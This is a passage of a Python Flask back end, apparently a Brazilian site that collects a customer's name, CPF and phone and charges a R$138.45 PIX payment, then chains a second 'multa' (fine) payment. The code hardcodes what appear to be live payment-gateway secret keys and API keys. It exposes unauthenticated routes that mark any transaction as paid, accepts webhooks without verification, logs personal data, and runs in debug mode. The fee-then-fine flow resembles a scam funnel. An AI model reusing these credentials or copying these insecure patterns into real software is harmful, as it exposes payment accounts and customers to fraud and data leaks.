                'MEDIUS_PAG_SECRET_KEY': '***configured***' if os.environ.get('MEDIUS_PAG_SECRET_KEY') else 'not_set',
                'MEDIUS_PAG_COMPANY_ID': '***configured***' if os.environ.get('MEDIUS_PAG_COMPANY_ID') else 'not_set',
                'SESSION_SECRET': '***configured***' if os.environ.get('SESSION_SECRET') else 'not_set'
            },
            'heroku_detected': bool(os.environ.get('DYNO')),
            'working_directory': os.getcwd(),
            'python_path': sys.path[:3]  # Primeiros 3 paths
        }
        
        # Teste de conectividade com APIs externas
        connectivity_tests = {}
        
        # Testar conectividade MEDIUS PAG
        try:
            response = requests.get('https://api.mediuspag.com/', timeout=10)
            connectivity_tests['medius_pag'] = {
                'status': 'ok' if response.status_code in [200, 404] else f'error_{response.status_code}',
                'response_time': response.elapsed.total_seconds()
            }
        except Exception as e:
            connectivity_tests['medius_pag'] = {
                'status': 'error',
                'error': str(e)
            }
        
        # Testar conectividade Pushcut
        try:
            response = requests.get('https://api.pushcut.io/', timeout=10)
            connectivity_tests['pushcut'] = {
                'status': 'ok' if response.status_code in [200, 404] else f'error_{response.status_code}',
                'response_time': response.elapsed.total_seconds()
            }
        except Exception as e:
            connectivity_tests['pushcut'] = {
                'status': 'error',
                'error': str(e)
            }
        
        return jsonify({
            'success': True,
            'debug_info': debug_info,
            'connectivity_tests': connectivity_tests,
            'message': 'Debug info coletada com sucesso'
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e),
            'message': 'Erro ao coletar debug info'
        }), 500

@app.route('/generate-pix-techbynet', methods=['POST'])
def generate_pix_techbynet():
    """Gerar PIX usando TechByNet API"""
    try:
        app.logger.info("[TECHBYNET] Iniciando geração de PIX via TechByNet...")

        # Pegar dados do JSON request (telefone enviado pelo frontend)
        request_data = request.get_json() or {}
        app.logger.info(f"[TECHBYNET] Dados recebidos do frontend: {request_data}")

        # Inicializar API TechByNet com a chave fornecida
        api = create_techbynet_api('d78e25d6-f4bf-456a-be80-ee1324f2b638')
        app.logger.info("[TECHBYNET] API inicializada com chave fornecida")

        # Pegar dados enviados pelo frontend (do localStorage)
        request_data = request.get_json() or {}
        customer_data = {
            'nome': request_data.get('nome', ''),
            'cpf': request_data.get('cpf', ''),
            'phone': request_data.get('telefone', '')
        }
        
        # Se não recebeu dados do frontend, algo está errado
        if not customer_data['nome'] or not customer_data['cpf']:
            app.logger.warning(f"[PROD] ⚠️ Dados incompletos recebidos no endpoint TechByNet: {customer_data}")
            if not customer_data['nome']:
                customer_data['nome'] = 'CLIENTE SEM NOME'
            if not customer_data['cpf']:
                customer_data['cpf'] = '00000000000'
            if not customer_data['phone']:
                customer_data['phone'] = '11999999999'

        # Usar telefone do frontend ou fallback
        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "11987689080"
            app.logger.warning(f"[TECHBYNET] Telefone não fornecido ou inválido, usando fallback: {user_phone}")
        else:
            user_phone = ''.join(filter(str.isdigit, user_phone))
            app.logger.info(f"[TECHBYNET] Usando telefone fornecido: {user_phone}")

        # Dados do usuário para transação
        user_name = customer_data['nome']
        user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')
        user_email = "gerarpagamento@gmail.com"
        amount = 138.45  # Valor padrão

        app.logger.info(f"[TECHBYNET] Dados da transação: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")

        # Preparar dados para API TechByNet
        customer_info = {
            'nome': user_name,
            'cpf': user_cpf,
            'email': user_email,
            'phone': user_phone
        }

        # Criar transação PIX
        result = api.create_pix_transaction(
            customer_data=customer_info,
            amount=amount,
            phone=user_phone,
            postback_url=f"https://{request.host}/techbynet-webhook"
        )

        if result.get('success'):
            app.logger.info(f"[TECHBYNET] ✅ Transação criada com sucesso - ID: {result.get('transaction_id')}")
            
            # Preparar resposta para o frontend
            response_data = {
                'success': True,
                'transaction_id': result.get('transaction_id'),
                'pix_code': result.get('pix_code'),
                'qr_code': result.get('qr_code'),
                'amount': amount,
                'provider': 'TechByNet',
                'expires_at': result.get('expires_at'),
                'external_ref': result.get('external_ref')
            }

            # Se temos QR code, garantir formato base64 para frontend
            if result.get('qr_code'):
                try:
                    import qrcode
                    import io
                    import base64
                    from PIL import Image

                    # Gerar QR code se não temos base64
                    qr = qrcode.QRCode(version=1, box_size=10, border=5)
                    qr.add_data(result['qr_code'])
                    qr.make(fit=True)
                    
                    img = qr.make_image(fill_color="black", back_color="white")
                    buffered = io.BytesIO()
                    img.save(buffered, format="PNG")
                    img_str = base64.b64encode(buffered.getvalue()).decode()
                    
                    response_data['qr_code_base64'] = img_str
                    response_data['qr_code_image'] = f"data:image/png;base64,{img_str}"
                    
                except Exception as qr_error:
                    app.logger.warning(f"[TECHBYNET] Erro ao gerar QR code visual: {qr_error}")

            return jsonify(response_data)
        else:
            app.logger.error(f"[TECHBYNET] ❌ Erro na criação da transação: {result.get('error')}")
            return jsonify({
                'success': False,
                'error': result.get('error', 'Erro desconhecido na TechByNet'),
                'details': result.get('details', '')
            }), 400

    except Exception as e:
        app.logger.error(f"[TECHBYNET] ❌ Erro geral: {e}")
        return jsonify({
            'success': False,
            'error': 'Erro interno do servidor ao gerar PIX TechByNet'
        }), 500

@app.route('/generate-pix-multa-techbynet', methods=['POST'])
def generate_pix_multa_techbynet():
    """Gerar PIX para multa usando TechByNet API"""
    try:
        app.logger.info("[TECHBYNET] Iniciando geração de PIX para multa via TechByNet...")

        request_data = request.get_json() or {}
        
        # Inicializar API TechByNet
        api = create_techbynet_api('d78e25d6-f4bf-456a-be80-ee1324f2b638')
        
        # Pegar dados enviados pelo frontend (do localStorage)
        customer_data = {
            'nome': request_data.get('nome', ''),
            'cpf': request_data.get('cpf', ''),
            'phone': request_data.get('telefone', '')
        }
        
        # Se não recebeu dados do frontend, algo está errado
        if not customer_data['nome'] or not customer_data['cpf']:
            app.logger.warning(f"[PROD] ⚠️ Dados incompletos recebidos: {customer_data}")
            # Usar dados mínimos apenas em caso de emergência
            if not customer_data['nome']:
                customer_data['nome'] = 'CLIENTE SEM NOME'
            if not customer_data['cpf']:
                customer_data['cpf'] = '00000000000'
            if not customer_data['phone']:
                customer_data['phone'] = '11999999999'
        
        app.logger.info(f"[PROD] Dados do cliente recebidos no endpoint TechByNet: Nome={customer_data['nome']}, CPF={customer_data['cpf']}, Phone={customer_data['phone']}")

        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "11987689080"
        else:
            user_phone = ''.join(filter(str.isdigit, user_phone))

        user_name = customer_data['nome']
        user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')
        amount = 58.60  # Valor da multa

        customer_info = {
            'nome': user_name,
            'cpf': user_cpf,
            'email': "gerarpagamento@gmail.com",
            'phone': user_phone
        }

        # Criar transação PIX para multa
        result = api.create_pix_transaction(
            customer_data=customer_info,
            amount=amount,
            phone=user_phone,
            postback_url=f"https://{request.host}/techbynet-webhook"
        )

        if result.get('success'):
            app.logger.info(f"[TECHBYNET] ✅ Transação multa criada - ID: {result.get('transaction_id')}")
            
            response_data = {
                'success': True,
                'transaction_id': result.get('transaction_id'),
                'pix_code': result.get('pix_code'),
                'qr_code': result.get('qr_code'),
                'amount': amount,
                'provider': 'TechByNet',
                'expires_at': result.get('expires_at'),
                'external_ref': result.get('external_ref')
            }

            # Gerar QR code visual se necessário
            if result.get('qr_code'):
                try:
                    import qrcode
                    import io
                    import base64

                    qr = qrcode.QRCode(version=1, box_size=10, border=5)
                    qr.add_data(result['qr_code'])
                    qr.make(fit=True)
                    
                    img = qr.make_image(fill_color="black", back_color="white")
                    buffered = io.BytesIO()
                    img.save(buffered, format="PNG")
                    img_str = base64.b64encode(buffered.getvalue()).decode()
                    
                    response_data['qr_code_base64'] = img_str
                    response_data['qr_code_image'] = f"data:image/png;base64,{img_str}"
                    
                except Exception as qr_error:
                    app.logger.warning(f"[TECHBYNET] Erro ao gerar QR code para multa: {qr_error}")

            return jsonify(response_data)
        else:
            app.logger.error(f"[TECHBYNET] ❌ Erro na criação da transação multa: {result.get('error')}")
            return jsonify({
                'success': False,
                'error': result.get('error', 'Erro desconhecido na TechByNet'),
                'details': result.get('details', '')
            }), 400

    except Exception as e:
        app.logger.error(f"[TECHBYNET] ❌ Erro geral na multa: {e}")
        return jsonify({
            'success': False,
            'error': 'Erro interno do servidor ao gerar PIX multa TechByNet'
        }), 500

@app.route('/pagnet-webhook', methods=['POST'])
def pagnet_webhook():
    """Webhook para receber notificações de pagamento da Pagnet"""
    try:
        app.logger.info("[PAGNET-WEBHOOK] Recebendo webhook da Pagnet...")
        app.logger.info(f"[PAGNET-WEBHOOK] Headers: {dict(request.headers)}")
        app.logger.info(f"[PAGNET-WEBHOOK] URL: {request.url}")
        
        # Capturar dados do webhook
        data = request.get_json()
        app.logger.info(f"[PAGNET-WEBHOOK] Dados recebidos: {data}")
        
        if data:
            # Processar dados do webhook Pagnet
            # A estrutura pode variar, vamos ser flexíveis
            status = data.get('status') or data.get('paymentStatus') or data.get('state')
            transaction_id = data.get('id') or data.get('transactionId') or data.get('reference')
            amount_cents = data.get('amount', 0)
            
            # Se amount está em formato diferente, ajustar
            if isinstance(amount_cents, float):
                amount = amount_cents
                amount_cents = int(amount_cents * 100)
            else:
                amount = amount_cents / 100 if amount_cents else 0
            
            app.logger.info(f"[PAGNET-WEBHOOK] Status: {status}, ID: {transaction_id}, Valor: R$ {amount:.2f}")
            
            # Verificar se é um pagamento confirmado
            # Pagnet pode usar status diferentes, vamos ser flexíveis
            if status in ['WAITING_PAYMENT', 'pending', 'paid', 'PAID', 'approved', 'APPROVED', 'completed', 'COMPLETED']:
                if status in ['paid', 'PAID', 'approved', 'APPROVED', 'completed', 'COMPLETED']:
                    # Marcar transação como paga
                    paid_transactions.add(transaction_id)
                    app.logger.info(f"[PAGNET-WEBHOOK] Pagamento confirmado - ID: {transaction_id}")
                    
                    # Se é o valor principal (R$ 138,45), autorizar redirect para multa
                    if amount_cents == 13845:  # R$ 138,45 em centavos
                        app.logger.info(f"[PAGNET-WEBHOOK] Pagamento principal confirmado - Autorizado redirect para /multa")
                        return jsonify({
                            'success': True,
                            'message': 'Pagamento principal confirmado via Pagnet',
                            'redirect_to_multa': True
                        }), 200
                    
                    return jsonify({
                        'success': True,
                        'message': 'Pagamento confirmado via Pagnet'
                    }), 200
                else:
                    app.logger.info(f"[PAGNET-WEBHOOK] Transação aguardando pagamento: {transaction_id}")
                    return jsonify({
                        'success': True,
                        'message': 'Transação aguardando pagamento'
                    }), 200
            
            app.logger.info(f"[PAGNET-WEBHOOK] Status não reconhecido: {status}")
        
        return jsonify({'success': True, 'message': 'Webhook processado'}), 200
        
    except Exception as e:
        app.logger.error(f"[PAGNET-WEBHOOK] Erro ao processar webhook: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/techbynet-webhook', methods=['POST'])
def techbynet_webhook():
    """Webhook para receber notificações de pagamento da TechByNet (mantido para compatibilidade)"""
    try:
        app.logger.info("[TECHBYNET-WEBHOOK] Recebendo webhook da TechByNet...")
        app.logger.info(f"[TECHBYNET-WEBHOOK] Headers: {dict(request.headers)}")
        app.logger.info(f"[TECHBYNET-WEBHOOK] URL: {request.url}")
        
        # Capturar dados do webhook
        data = request.get_json()
        app.logger.info(f"[TECHBYNET-WEBHOOK] Dados recebidos: {data}")
        
        if data:
            # Processar dados do webhook TechByNet
            status = data.get('status')
            transaction_id = data.get('id')
            amount_cents = data.get('amount', 0)
            amount = amount_cents / 100 if amount_cents else 0
            
            app.logger.info(f"[TECHBYNET-WEBHOOK] Status: {status}, ID: {transaction_id}, Valor: R$ {amount:.2f}")
            
            # Verificar se é um pagamento confirmado
            if status in ['WAITING_PAYMENT', 'paid', 'PAID', 'approved', 'APPROVED']:
                if status in ['paid', 'PAID', 'approved', 'APPROVED']:
                    # Marcar transação como paga
                    paid_transactions.add(transaction_id)
                    app.logger.info(f"[TECHBYNET-WEBHOOK] Pagamento confirmado - ID: {transaction_id}")
                    
                    # Se é o valor principal (R$ 138,45), autorizar redirect para multa
                    if amount_cents == 13845:  # R$ 138,45 em centavos
                        app.logger.info(f"[TECHBYNET-WEBHOOK] Pagamento principal confirmado - Autorizado redirect para /multa")
                        return jsonify({
                            'success': True,
                            'message': 'Pagamento principal confirmado via TechByNet',
                            'redirect_to_multa': True
                        }), 200
                    
                    return jsonify({
                        'success': True,
                        'message': 'Pagamento confirmado via TechByNet'
                    }), 200
                else:
                    app.logger.info(f"[TECHBYNET-WEBHOOK] Transação aguardando pagamento: {transaction_id}")
                    return jsonify({
                        'success': True,
                        'message': 'Transação aguardando pagamento'
                    }), 200
            
            app.logger.info(f"[TECHBYNET-WEBHOOK] Status não reconhecido: {status}")
        
        return jsonify({'success': True, 'message': 'Webhook processado'}), 200
        
    except Exception as e:
        app.logger.error(f"[TECHBYNET-WEBHOOK] Erro ao processar webhook: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/test-buckpay-direct')
def test_buckpay_direct():
    """Endpoint para testar BuckPay diretamente com dados simples"""
    try:
        # Teste com diferentes configurações da BuckPay
        from buckpay_api import BuckPayAPI
        import time
        
        # Usar a chave fornecida pelo usuário e tentar diferentes configurações
        secret_key = "d78e25d6-f4bf-456a-be80-ee1324f2b638"
        
        app.logger.info(f"[BUCKPAY-TEST] Testando com chave: {secret_key[:20]}...")
        buckpay_api = BuckPayAPI(secret_key=secret_key)
        
        # Testar autenticação primeiro
        auth_test = buckpay_api.test_authentication()
        if auth_test:
            app.logger.info(f"[BUCKPAY-TEST] ✅ Autenticação funcionando: {auth_test}")
        
        # Dados de teste
        test_data = {
            'amount': 10.0,
            'customer_name': 'TESTE USUARIO',
            'customer_cpf': '12345678900',
            'customer_email': 'teste@teste.com',
            'customer_phone': '11999999999',
            'description': 'Teste BuckPay API'
        }
        
        # Criar transação de teste
        result = buckpay_api.create_pix_transaction(test_data)
        
        return jsonify({
            'success': result.get('success', False),
            'result': result,
            'auth_test': auth_test,
            'test_data': test_data
        })
        
    except Exception as e:
        app.logger.error(f"[TEST] Erro no teste direto: {e}")
        return jsonify({'error': str(e)})

@app.route('/force-buckpay-transaction')
def force_buckpay_transaction():
    """Força criação de transação via BuckPay para aparecer no gateway"""
    try:
        import requests
        import time
        
        secret_key = "d78e25d6-f4bf-456a-be80-ee1324f2b638"
        
        # Diferentes URLs para testar
        urls_to_test = [
            "https://api.buckpay.com.br/v1/transactions",
            "https://api.buckpay.com.br/transactions", 
            "https://gateway.buckpay.com.br/v1/transactions",
            "https://gateway.buckpay.com.br/transactions",
            "https://api.realtechdev.com.br/v1/transactions",
            "https://api.realtechdev.com.br/transactions"
        ]
        
        # Payload de teste
        payload = {
            "external_id": f"FORCE_BUCKPAY_{int(time.time())}",
            "payment_method": "pix",
            "amount": 5000,  # R$ 50.00
            "buyer": {
                "name": "TESTE GATEWAY REAL",
                "email": "gateway@teste.com",
                "document": "12345678900",
                "phone": "5511999999999"
            },
            "description": "Teste forçado gateway BuckPay"
        }
        
        results = []
        
        for url in urls_to_test:
            try:
                headers = {
                    'Authorization': f'Bearer {secret_key}',
                    'Content-Type': 'application/json',
                    'User-Agent': 'BuckPay Gateway Test',
                    'Accept': 'application/json'
                }
                
                app.logger.info(f"[FORCE-BUCKPAY] Tentando URL: {url}")
                
                response = requests.post(url, json=payload, headers=headers, timeout=30)
                
                result = {
                    'url': url,
                    'status': response.status_code,
                    'response': response.text[:500],
                    'success': response.status_code in [200, 201]
                }
                
                results.append(result)
                
                # Se funcionou, retornar sucesso
                if response.status_code in [200, 201]:
                    app.logger.info(f"[FORCE-BUCKPAY] ✅ SUCESSO na URL: {url}")
                    return jsonify({
                        'success': True,
                        'message': 'Transação BuckPay criada com sucesso!',
                        'working_url': url,
                        'transaction_data': result,
                        'all_attempts': results
                    })
                    
            except Exception as e:
                results.append({
                    'url': url,
                    'error': str(e),
                    'success': False
                })
        
        return jsonify({
            'success': False,
            'message': 'Nenhuma URL funcionou',
            'all_attempts': results,
            'suggestion': 'Verificar se a chave da API está ativa no dashboard BuckPay'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/buckpay-diagnostics')
def buckpay_diagnostics():
    """Endpoint completo de diagnóstico da BuckPay API"""
    try:
        import requests
        import time
        
        secret_key = os.environ.get('BUCKPAY_SECRET_KEY')
        diagnostics = {
            'timestamp': time.time(),
            'secret_key_exists': bool(secret_key),
            'secret_key_prefix': secret_key[:20] + '...' if secret_key else None,
            'tests': []
        }
        
        if not secret_key:
            diagnostics['error'] = 'BUCKPAY_SECRET_KEY não configurada'
            return jsonify(diagnostics)
        
        # Teste 1: Endpoint básico da API
        try:
            response = requests.get('https://api.realtechdev.com.br', timeout=10)
            diagnostics['tests'].append({
                'test': 'base_url_connectivity',
                'status': response.status_code,
                'response_preview': response.text[:200] if response.text else 'empty'
            })
        except Exception as e:
            diagnostics['tests'].append({
                'test': 'base_url_connectivity', 
                'error': str(e)
            })
        
        # Teste 2: Diferentes headers de autenticação
        auth_variations = [
            {'Authorization': f'Bearer {secret_key}', 'User-Agent': 'Buckpay API'},
            {'Authorization': f'Basic {secret_key}', 'User-Agent': 'Buckpay API'},
            {'X-API-Key': secret_key, 'User-Agent': 'Buckpay API'},
            {'api-key': secret_key, 'User-Agent': 'Buckpay API'}
        ]
        
        for i, headers in enumerate(auth_variations):
            try:
                headers['Content-Type'] = 'application/json'
                response = requests.post(
                    'https://api.realtechdev.com.br/v1/transactions',
                    json={
                        "external_id": f"DIAG_{int(time.time())}_{i}",
                        "payment_method": "pix",
                        "amount": 100
                    },
                    headers=headers,
                    timeout=10
                )
                
                diagnostics['tests'].append({
                    'test': f'auth_method_{i+1}',
                    'headers': {k: v[:15] + '...' if k.startswith('Authorization') or k == 'api-key' else v for k, v in headers.items()},
                    'status': response.status_code,
                    'response': response.text[:300]
                })
                
                # Se algum método funcionar, pare aqui
                if response.status_code != 403:
                    diagnostics['working_auth_method'] = f'auth_method_{i+1}'
                    break
                    
            except Exception as e:
                diagnostics['tests'].append({
                    'test': f'auth_method_{i+1}',
                    'error': str(e)
                })
        
        # Teste 3: Verificar outros endpoints possíveis
        possible_endpoints = [
            '/v1/health',
            '/v1/status', 
            '/v1/ping',
            '/health',
            '/status'
        ]
        
        for endpoint in possible_endpoints:
            try:
                response = requests.get(
                    f'https://api.realtechdev.com.br{endpoint}',
                    headers={'Authorization': f'Bearer {secret_key}'},
                    timeout=5
                )
                if response.status_code != 404:
                    diagnostics['tests'].append({
                        'test': f'endpoint_{endpoint}',
                        'status': response.status_code,
                        'response': response.text[:200]
                    })
            except:
                pass
        
        return jsonify(diagnostics)
        
    except Exception as e:
        return jsonify({'error': str(e), 'test_type': 'diagnostics_failure'})

@app.route('/force-add-transaction/<transaction_id>')
def force_add_transaction(transaction_id):
    """Endpoint para forçar adição de transação paga (debug)"""
    paid_transactions.add(transaction_id)
    app.logger.info(f"[DEBUG] Transação {transaction_id} adicionada manualmente")
    return jsonify({
        'success': True,
        'message': f'Transação {transaction_id} adicionada',
        'paid_transactions': list(paid_transactions)
    }), 200

@app.route('/charge/webhook', methods=['POST'])
def charge_webhook():
    """Webhook endpoint para receber notificações de status da cobrança PIX"""
    try:
        data = request.get_json()
        app.logger.info(f"[PROD] Webhook recebido: {data}")
        
        # Processar notificação de status
        order_id = data.get('orderId')
        status = data.get('status')
        amount = data.get('amount')
        
        app.logger.info(f"[PROD] Status da cobrança {order_id}: {status} - Valor: R$ {amount}")
        
        # Aqui você pode adicionar lógica para processar o status
        # Por exemplo, atualizar banco de dados, enviar notificações, etc.
        
        return jsonify({'success': True, 'message': 'Webhook processado com sucesso'}), 200
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao processar webhook: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/check-payment-status/<order_id>')
def check_payment_status(order_id):
    """Verifica o status de uma transação PIX via MEDIUS PAG e lista de transações pagas"""
    try:
        app.logger.info(f"[PAYMENT_STATUS] ⚡ Verificando status da transação: {order_id}")
        
        # Primeiro verificar se a transação está na lista de pagas (via postback)
        if order_id in paid_transactions:
            app.logger.info(f"[PAYMENT_STATUS] 🎯 TRANSAÇÃO {order_id} ENCONTRADA NA LISTA DE PAGAS!")
            app.logger.info(f"[PAYMENT_STATUS] ✅ RETORNANDO STATUS 'PAID' - FRONTEND DEVE REDIRECIONAR!")
            return jsonify({
                'success': True,
                'status': 'paid',
                'transaction_id': order_id,
                'source': 'postback_confirmed',
                'redirect_to_multa': True
            })
        
        # Se não estiver na lista, tentar verificar via API (pode ter bugs)
        try:
            from medius_pag_api import create_medius_pag_api
            
            # Usa as mesmas credenciais da geração de PIX
            secret_key = "sk_live_BTKkjpUPYScK40qBr2AAZo4CiWJ8ydFht7aVlhIahVs8Zipz"
            company_id = "30427d55-e437-4384-88de-6ba84fc74833"
            
            api = create_medius_pag_api(secret_key=secret_key, company_id=company_id)
            status_data = api.check_transaction_status(order_id)
            
            app.logger.info(f"[PAYMENT_STATUS] 📊 Status retornado pela MEDIUS PAG: {status_data}")
            
            # Se a API retornar que está pago, adicionar à lista também
            if status_data.get('success') and status_data.get('status') == 'paid':
                paid_transactions.add(order_id)
                app.logger.info(f"[PAYMENT_STATUS] 🎯 PAGAMENTO CONFIRMADO VIA API! Transação {order_id} adicionada à lista")
                return jsonify({
                    'success': True,
                    'status': 'paid',
                    'transaction_id': order_id,
                    'source': 'api_confirmed',
                    'redirect_to_multa': True
                })
            else:
                app.logger.info(f"[PAYMENT_STATUS] ⏳ Pagamento ainda pendente para {order_id}")
                return jsonify(status_data)
                
        except Exception as api_error:
            app.logger.warning(f"[PAYMENT_STATUS] ⚠️ Erro na API MEDIUS PAG (usando fallback): {api_error}")
            # Retornar status pendente se API falhar
            return jsonify({
                'success': True,
                'status': 'waiting_payment',
                'transaction_id': order_id,
                'source': 'api_error_fallback'
            })
        
    except Exception as e:
        app.logger.error(f"[PAYMENT_STATUS] ❌ Erro geral ao verificar status: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/simulate-payment/<order_id>')
def simulate_payment(order_id):
    """Simula um pagamento confirmado para testes de redirecionamento"""
    app.logger.info(f"[SIMULATE] 🧪 Simulando pagamento confirmado para transação: {order_id}")
    
    return jsonify({
        'success': True,
        'status': 'paid',
        'transaction_id': order_id,
        'amount': 48.74,
        'paid_at': '2025-07-20T19:45:00.000-03:00',
        'data': {
            'note': 'Pagamento simulado para teste de redirecionamento',
            'simulated': True
        }
    })

@app.route('/force-redirect-test')
def force_redirect_test():
    """Endpoint para testar o redirecionamento forçado para /multa"""
    app.logger.info(f"[TEST] 🧪 Teste de redirecionamento forçado para /multa")
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Teste de Redirecionamento</title>
    </head>
    <body>
        <h1>Teste de Redirecionamento</h1>
        <p>Redirecionando para /multa em 3 segundos...</p>
        <script>
            console.log('🧪 Iniciando teste de redirecionamento...');
            setTimeout(() => {
                console.log('🔄 Redirecionando para /multa...');
                window.location.href = '/multa';
            }, 3000);
        </script>
    </body>
    </html>
    """

@app.route('/mark-transaction-paid/<transaction_id>')
def mark_transaction_paid(transaction_id):
    """Endpoint para marcar manualmente uma transação como paga (para testes)"""
    paid_transactions.add(transaction_id)
    app.logger.info(f"[TEST] 🧪 Transação {transaction_id} marcada como paga manualmente")
    return jsonify({
        'success': True,
        'message': f'Transação {transaction_id} marcada como paga',
        'total_paid_transactions': len(paid_transactions)
    })

@app.route('/test-techbynet')
def test_techbynet():
    """Endpoint para testar a API TechByNet com dados simples"""
    try:
        app.logger.info("[TEST-TECHBYNET] Iniciando teste da API TechByNet...")
        
        # Inicializar API com a chave fornecida
        api = create_techbynet_api('d78e25d6-f4bf-456a-be80-ee1324f2b638')
        
        # Dados de teste
        customer_data = {
            'nome': 'TESTE TECHBYNET',
            'cpf': '12345678901',
            'email': 'teste@techbynet.com',
            'phone': '11999999999'
        }
        
        # Criar transação de teste
        result = api.create_pix_transaction(
            customer_data=customer_data,
            amount=10.50,  # R$ 10,50 para teste
            phone='11999999999',
            postback_url=f"https://{request.host}/techbynet-webhook"
        )
        
        return jsonify({
            'success': True,
            'test_result': result,
            'api_key_configured': True,
            'base_url': 'https://api-gateway.techbynet.com',
            'message': 'Teste TechByNet executado'
        })
        
    except Exception as e:
        app.logger.error(f"[TEST-TECHBYNET] Erro no teste: {e}")
        return jsonify({
            'success': False,
            'error': str(e),
            'message': 'Erro ao testar TechByNet'
        }), 500

@app.route('/provider-status')
def provider_status():
    """Endpoint para verificar status de todos os provedores de pagamento"""
    try:
        providers = {
            'buckpay': {
                'name': 'BuckPay',
                'status': 'configured',
                'primary': False,
                'base_url': 'https://api.realtechdev.com.br',
                'test_endpoint': '/test-buckpay-direct'
            },
            'techbynet': {
                'name': 'TechByNet', 
                'status': 'configured',
                'primary': True,
                'base_url': 'https://api-gateway.techbynet.com',
                'test_endpoint': '/test-techbynet',
                'api_key': 'e884b37a-987a-49ba-b860-ae6b66b65f79'
            },
            'medius_pag': {
                'name': 'MEDIUS PAG',
                'status': 'fallback',
                'primary': False,
                'base_url': 'https://api.mediuspag.com',
                'test_endpoint': None
            },
            'brazilian_pix': {
                'name': 'Brazilian PIX Generator',
                'status': 'fallback',
                'primary': False,
                'base_url': 'internal',
                'test_endpoint': None
            }
        }
        
        return jsonify({
            'success': True,
            'providers': providers,
            'total_providers': len(providers),
            'message': 'Status dos provedores de pagamento'
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/test-payment')
def test_payment():
    """Página de teste para verificar redirecionamento de pagamento"""
    return render_template('test_payment.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)